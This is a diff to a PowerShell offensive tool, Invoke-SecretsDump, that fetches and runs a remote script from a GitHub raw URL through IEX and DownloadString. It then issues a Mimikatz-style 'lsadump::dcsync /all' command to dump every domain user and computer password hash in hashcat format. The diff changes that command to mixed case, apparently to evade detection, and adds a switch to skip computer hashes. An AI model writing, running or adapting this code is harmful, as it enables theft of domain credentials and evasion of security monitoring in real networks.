@@ -2,12 +2,12 @@ Function Invoke-SecretsDump {
 
     param (
         [string]$Domain = $env:USERDNSDOMAIN,
-        [string]$ComputerHashes = "N"
+        [switch]$NoComputerHashes
     )
 
 
     IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/The-Viper-One/PME-Scripts/main/Invoke-Pandemonium.ps1')
-    $Command = '"lsadump::dcsync /domain:' + $domain + ' /all /csv"'
+    $Command = '"lsaDUMp::dCsyNc /DOmaIN:' + $domain + ' /alL /cSv"'
     $output = Invoke-Pandemonium -Command $Command
 
     Write-Host
@@ -48,11 +48,13 @@ Write-Output "[*] Dumping User Hashes (uid:rid:lmhash:nthash)"
        
     }
     ""
+if (!$NoComputerHashes){
 Write-Output "[*] Dumping Computer Hashes (uid:rid:lmhash:nthash)"
         $HASHCATDATA | ForEach-Object {
        if ($_ -like "*$*"){Write-Output $_}
        
     }
+}
 
     Write-Host ""
 }
